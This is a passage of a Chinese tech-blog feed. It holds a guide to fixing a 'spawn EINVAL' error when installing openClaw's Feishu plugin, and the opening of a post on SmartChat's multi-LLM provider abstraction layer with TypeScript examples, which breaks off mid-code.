itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            openClaw安装飞书插件｜核心踩坑：spawn EINVAL 错误终极解决指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4135726601221641/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    MicRabbit
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T16:30:03.000Z" title="Thu Feb 12 2026 16:30:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>作为经常折腾本地工具的开发者，最近在部署openClaw飞书插件时，被 <code>spawn EINVAL</code> 报错卡了一下午！结合自己的实际操作，整理了这篇<strong>重点聚焦该错误</strong>的踩坑分享，从错误原因、无效误区、详细解决步骤，到兜底方案，全程干货，帮正在踩坑的小伙伴一次性解决，少走弯路！</p>
<p>先说明我的环境：Windows 和 Mac 环境都遇到同样问题，作为偏前端开发两个环境均安装了nvm管理Node版本，核心需求是本地部署openClaw飞书插件（自用机器人调试），无复杂部署场景，所有操作均为本地调试可用，新手也能跟着走。</p>
<p>OpenClaw的安装步骤就不重复了，跟着官网走就可以。</p>
<p>翻阅资料和看其他博主的视频时发现飞书插件安装时都没遇到我的问题，所以在解决问题之后反思了一下，大概率是我的Node环境是安装在nvm内的（该观点并未重复验证），先进入正文</p>
<h2 data-id="heading-0">一、核心报错：spawn EINVAL（必踩坑，先认清错误本质）</h2>
<p>这是openClaw安装飞书插件时最高频、最棘手的错误，很多小伙伴会被网上的过时方案误导，白费功夫。先明确错误的完整现象和核心原因，避免走偏。</p>
<h3 data-id="heading-1">❌ 完整错误现象（对照自查，确认你踩的是同一个坑）</h3>
<p>执行飞书插件安装命令 <code>openclaw plugins install @openclaw/feishu</code> 后，终端立即报错，无法继续安装，完整报错堆栈如下（重点标注核心错误 <code>spawn EINVAL</code>）：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5a9fbc147234a2db8eea1d8e1632e72~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWljUmFiYml0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771518602&amp;x-signature=hvl2FtEBBo9C9xpg5rXNE6AGjsI%3D" alt="image.png" loading="lazy"/></p>
<p>核心特征：报错首行提示 <code>Failed to start CLI: Error: spawn EINVAL</code>，后续关联 <code>child_process.spawn</code> 相关堆栈，插件安装直接中断，重复执行命令依然报错。</p>
<h3 data-id="heading-2">🔍 错误核心原因（关键！搞懂原因才不会被误导）</h3>
<p>很多教程说“Node版本过高导致”，其实是错误的！结合我的排查和实操验证，核心原因是：</p>
<p><strong>openClaw飞书插件本地扩展包（feishu文件夹）中的 package.json 配置不兼容</strong> —— 该配置文件中，依赖版本、入口文件路径或脚本命令存在异常，导致Node.js的 <code>child_process.spawn</code> 方法无法正常创建子进程，进而启动CLI失败，报出 <code>spawn EINVAL</code>（无效参数）错误。</p>
<p>补充：该错误与Node版本无关（我用v22，只要修改配置，均可解决），无需降级Node，白费功夫的操作一定要避开。</p>
<h3 data-id="heading-3">❌ 网上常见无效尝试（别再踩！亲测3次均失败）</h3>
<p>一开始看到报错，我跟着网上的教程做了3种尝试，均无效，整理出来帮大家避坑：</p>
<ol>
<li>Node版本降级：用nvm降级到v20、v18，清理npm缓存、重新安装openClaw，报错依然存在；</li>
<li>直接重新安装插件：反复执行 <code>openclaw plugins install @openclaw/feishu</code>，甚至卸载重装openClaw，无法解决配置不兼容问题；</li>
<li>非管理员终端安装：未用管理员身份运行终端，导致权限不足，但即使提升权限，不修改配置依然报错（权限不是核心原因）。</li>
</ol>
<h3 data-id="heading-4">✅ 终极解决方案（亲测有效，分步拆解，新手可跟）</h3>
<p>核心逻辑：找到异常的 package.json 文件 → 备份并修改配置 → 本地重装插件 → 重启验证，步骤清晰，一步到位，全程无需降级Node。</p>
<p><strong>第一步：精准定位目标 package.json 文件（关键第一步，别找错路径）</strong> 该文件在openClaw的飞书插件扩展包中，路径根据你的nvm安装位置调整，我的路径如下（可直接复制，替换用户名即可）：<code>C:\nvm4w\nodejs\node_modules\openclaw\extensions\feishu</code>（MacOS找到对应的nvm目录内的openClaw的插件目录）操作：打开文件资源管理器，将上述路径粘贴到地址栏，回车即可快速定位，文件夹中会看到 <code>package.json</code> 文件（核心修改文件）。</p>
<p><strong>第二步：备份文件+修改配置（避免出错，重中之重）</strong> ① 备份文件：复制一份 <code>package.json</code> 文件，重命名为 <code>package.json.bak</code>（万一修改错误，可直接恢复原文件，避免插件彻底损坏）；② 修改配置：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c098bb4549ab40cf8ad09672c59fe1a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWljUmFiYml0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771518602&amp;x-signature=zjQCWGTQWgMT13w362DTGnlPtT8%3D" alt="image.png" loading="lazy"/></p>
<p>修改这里 将 workspace:* 去掉</p>
<pre><code class="hljs language-json" lang="json">  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
     <span class="hljs-attr">"openclaw"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">""</span> 
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
</code></pre>
<p>从这里的修改上我怀疑导致报错的根本原因是：我本机环境安装的nvm 导致 workspace:* 的目录检查失败了</p>
<p><strong>第三步：安装openclaw官方文档使用本地代码安装飞书渠道</strong></p>
<p>openclaw官方文档 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.openclaw.ai%2Fzh-CN%2Fchannels%2Ffeishu" target="_blank" title="https://docs.openclaw.ai/zh-CN/channels/feishu" ref="nofollow noopener noreferrer">docs.openclaw.ai/zh-CN/chann…</a></p>
<p>使用本地安装的方式：
① 打开cmd或者powershell 进入飞书插件目录
② 使用npm i或者pnpm i安装依赖</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5789321323894f08a6a479f0688b9361~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWljUmFiYml0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771518602&amp;x-signature=f2kbfOk9zVnMMiMxwnf8O5L8TCo%3D" alt="image.png" loading="lazy"/></p>
<p>至此 飞书插件安装成功！</p>
<p><strong>第四步：重启openclaw验证错误是否修复，并配置飞书</strong></p>
<p>① 重启openClaw： openclaw onboard 在Select channel时选择飞书</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9327f484e24744ad87db6850d0beb423~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWljUmFiYml0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771518602&amp;x-signature=Qf%2FbMKa68nvDLJRhor67Z39ct9c%3D" alt="image.png" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b701b5925588407b97d19e2f77b6149a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWljUmFiYml0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771518602&amp;x-signature=eeu2f5ctaZfiYkwK9iwGldMyDZM%3D" alt="image.png" loading="lazy"/></p>
<p>选择后不报错 可以配置飞书应用的 App ID 和  App Secret，即可在飞书创建应用并链接openclaw进行会话了！</p>
<h3 data-id="heading-5">🔧 兜底方案（若修改配置后仍报错，直接用这个）</h3>
<p>若按上述步骤操作后，依然报 <code>spawn EINVAL</code> 错误，大概率是 package.json 修改不到位，可直接用以下兜底方案，绕开配置修改难题：</p>
<ol>
<li>卸载当前飞书插件：<code>openclaw plugins uninstall @openclaw/feishu</code>；</li>
<li>删除feishu扩展包：删除 <code>C:\nvm4w\nodejs\node_modules\openclaw\extensions\feishu</code> 整个文件夹；</li>
<li>手动克隆插件源码：执行 <code>git clone https://github.com/openclaw/feishu.git</code>，将克隆后的feishu文件夹，复制到上述extensions目录下；</li>
<li>本地安装：进入feishu文件夹，执行 <code>npm install</code> 安装依赖，再执行 <code>openclaw plugins install ./</code>，重启openClaw即可。</li>
</ol>
<h2 data-id="heading-6">二、补充：报错解决后，简单配置（快速适配本地自用）</h2>
<p>重点分享报错处理，配置部分精简核心要点，无需深入，快速完成部署：</p>
<ul>
<li>Feishu DM policy（私信策略）：选<code>Pairing (recommended)</code>（配对模式），用户主动打招呼才能发私信，安全不骚扰；</li>
<li>Group chat policy（群聊策略）：选 <code>Allowlist</code>（白名单模式），只在自己的测试群响应，避免滥用；</li>
<li>Group chat allowlist（群聊白名单）：复制飞书群ID（群设置→最底部），多个群用英文逗号隔开，留空即禁用群聊响应；</li>
<li>feishu account name (default)：直接按回车，用默认账号即可，本地自用无需修改。</li>
</ul>
<h2 data-id="heading-7">三、核心总结（重点牢记，下次遇到直接解决）</h2>
<p>整篇分享聚焦 <code>spawn EINVAL</code> 错误，记住3个核心要点，下次遇到无需查教程：</p>
<ol>
<li>错误本质：飞书插件的 package.json 配置不兼容，与Node版本无关，无需降级；</li>
<li>核心解决：定位 → 备份修改 package.json → 管理员本地重装 → 重启验证；</li>
<li>兜底方案：删除异常扩展包，手动克隆源码安装，100%解决配置问题。</li>
</ol>
<h2 data-id="heading-8">四、最后碎碎念</h2>
<p>其实 <code>spawn EINVAL</code> 报错并不难解决，踩坑主要是因为网上部分解决方案过时，误导大家去降级Node。希望这篇重点聚焦该错误的分享，能帮到正在折腾openClaw飞书插件的小伙伴，避开无效操作，快速解决问题。</p>
<p>如果大家遇到了其他相关报错，或者有更简洁的解决方法，欢迎在评论区交流补充，一起少走弯路～</p>
<p>#openClaw #飞书插件 #飞书机器人 #开发者踩坑 #spawn EINVAL #本地部署 #Node.js #前端工具</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[告别 LLM 供应商锁定 — SmartChat 的多模型 Provider 抽象层设计实践]]></title>    <link>https://juejin.cn/post/7605811866908000265</link>    <guid>https://juejin.cn/post/7605811866908000265</guid>    <pubDate>2026-02-12T17:17:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605811866908000265" data-draft-id="7605711582430494771" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="告别 LLM 供应商锁定 — SmartChat 的多模型 Provider 抽象层设计实践"/> <meta itemprop="keywords" content="前端,后端"/> <meta itemprop="datePublished" content="2026-02-12T17:17:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="梦里寻码"/> <meta itemprop="url" content="https://juejin.cn/user/528241507974520"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            告别 LLM 供应商锁定 — SmartChat 的多模型 Provider 抽象层设计实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/528241507974520/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    梦里寻码
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T17:17:13.000Z" title="Thu Feb 12 2026 17:17:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>做 AI 应用最怕什么？供应商锁定。今天 OpenAI 涨价，明天某个国产模型效果更好，后天客户要求用私有化部署的模型……如果代码和某个 LLM 提供商深度耦合，每次切换都是一次重构。</p>
<p>SmartChat 通过一个 Provider 抽象层，实现了 7+ 个 LLM 提供商的无缝切换。来看看它是怎么设计的。</p>
<blockquote>
<p>🔗 <strong>项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fsmartchat.nofx.asia%2F" target="_blank" title="https://smartchat.nofx.asia/" ref="nofollow noopener noreferrer">smartchat.nofx.asia/</a></strong></p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a046cdc202874e49b3cbaff7691166a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qKm6YeM5a-756CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771521604&amp;x-signature=4r%2FFuGWUK0PTxlfXi6pEB4AD7lQ%3D" alt="微信图片_20260212194717_45_236.png" loading="lazy"/></p>
<h2 data-id="heading-1">一、问题：LLM 提供商的碎片化</h2>
<p>目前主流的 LLM 提供商各有各的 SDK 和 API 格式：</p>
<ul>
<li><strong>OpenAI</strong>：<code>openai</code> SDK，<code>/v1/chat/completions</code></li>
<li><strong>Anthropic</strong>：<code>@anthropic-ai/sdk</code>，<code>/v1/messages</code>，完全不同的消息格式</li>
<li><strong>国产模型</strong>：大多兼容 OpenAI 格式，但 base URL 和模型名不同</li>
</ul>
<p>如果每个提供商写一套调用逻辑，代码会变成这样：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 反面教材：硬编码每个提供商</span>
<span class="hljs-keyword">if</span> (provider === <span class="hljs-string">'openai'</span>) {
  <span class="hljs-comment">// OpenAI 的调用逻辑</span>
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (provider === <span class="hljs-string">'anthropic'</span>) {
  <span class="hljs-comment">// Anthropic 的调用逻辑</span>
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (provider === <span class="hljs-string">'deepseek'</span>) {
  <span class="hljs-comment">// DeepSeek 的调用逻辑</span>
} <span class="hljs-comment">// ... 无限 if-else</span>
</code></pre>
<h2 data-id="heading-2">二、SmartChat 的 Provider 抽象层</h2>
<p>SmartChat 的核心思路是：<strong>将所有提供商归为两类 SDK（OpenAI 和 Anthropic），通过预设配置 + 统一接口消除差异</strong>。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// Provider 预设配置</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PROVIDER_PRESETS</span> = {
  <span class="hljs-attr">openai</span>: {
    <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'https://api.openai.com/v1'</span>,
    <span class="hljs-attr">models</span>: [<span class="hljs-string">'gpt-4o'</span>, <span class="hljs-string">'gpt-4o-mini'</span>, <span class="hljs-string">'gpt-3.5-turbo'</span>],
    <span class="hljs-attr">sdk</span>: <span class="hljs-string">'openai'</span>
  },
  <span class="hljs-attr">deepseek</span>: {
    <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'https://api.deepseek.com/v1'</span>,
    <span class="hljs-attr">models</span>: [<span class="hljs-string">'deepseek-chat'</span>, <span class="hljs-string">'deepseek-reasoner'</span>],
    <span class="hljs-attr">sdk</span>: <span class="hljs-string">'openai'</span>  <span class="hljs-comment">// DeepSeek 兼容 OpenAI 格式</span>
  },
  <span class="hljs-attr">qwen</span>: {
    <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'https://dashscope.aliyuncs.com/compatible-mode/v1'</span>,
    <span class="hljs-attr">models</span>: [<span class="hljs-string">'qwen-turbo'</span>, <span class="hljs-string">'qwen-plus'</span>, <span class="hljs-string">'qwen-max'</span>],
    <span class="hljs-attr">sdk</span>: <span class="hljs-string">'openai'</span>  <span class="hljs-comment">// 通义千问也兼容 OpenAI 格式</span>
  },
  <span class="hljs-attr">anthropic</span>: {
    <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'https://api.anthropic.com'</span>,
    <span class="hljs-attr">models</span>: [<span class="hljs-string">'claude-3-5-sonnet'</span>, <span class="hljs-string">'claude-3-haiku'</span>],
    <span class="hljs-attr">sdk</span>: <span class="hljs-string">'anthropic'</span>
  },
  <span class="hljs-attr">custom</span>: {
    <span class="hljs-attr">baseURL</span>: <span class="hljs-string">''</span>, <span class="hljs-comment">// 用户自定义</span>
    <span class="hljs-attr">models</span>: [],
    <span class="hljs-attr">sdk</span>: <span class="hljs-string">'openai'</span>  <span class="hljs-comment">// 默认走 OpenAI 兼容协议</span>
  }
};
</code></pre>
<p>关键洞察：<strong>绝大多数国产模型都兼容 OpenAI API 格式</strong>，所以只需要维护两套 SDK 调用逻辑（OpenAI 和 Anthropic），通过切换 <code>baseURL</code> 就能接入不同提供商。</p>
<h2 data-id="heading-3">三、统一的流式输出接口</h2>
<p>不同 SDK 的流式输出格式差异很大，SmartChat 将其统一为一个 <code>streamChat</code> 函数：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">streamChat</span>(<span class="hljs-params">params: {
  provider: <span class="hljs-built_in">string</span>;
  model: <span class="hljs-built_in">string</span>;
  messages: Message[];
  apiKey: <span class="hljs-built_in">string</span>;
  temperature?: <span class="hljs-built_in">number</span>;
}</span>) {
  <span class="hljs-keyword">const</span> preset = <span class="hljs-variable constant_">PROVIDER_PRESETS</span>[params.<span class="hljs-property">provider</span>];

  <span class="hljs-keyword">if</span> (preset.<span class="hljs-property">sdk</span> === <span class="hljs-string">'openai'</span>) {
    <span class="hljs-keyword">const</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAI</span>({
      <span class="hljs-attr">apiKey</span>: params.<span class="hljs-property">apiKey</span>,
      <span class="hljs-attr">baseURL</span>: preset.<span class="hljs-property">baseURL</span>
    });

    <span class="hljs-keyword">return</span> client.<span class="hljs-property">chat</span>.<span class="hljs-property">completions</span>.<span class="hljs-title function_">create</span>({
      <span class="hljs-attr">model</span>: params.<span class="hljs-property">model</span>,
      <span class="hljs-attr">messages</span>: params.<span class="hljs-property">messages</span>,
      <span class="hljs-attr">temperature</span>: params.<span class="hljs-property">temperature</span>,
      <span class="hljs-attr">stream</span>: <span class="hljs-literal">true</span>
    });
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (preset.<span class="hljs-property">sdk</span> === <span class="hljs-string">'anthropic'</span>) {
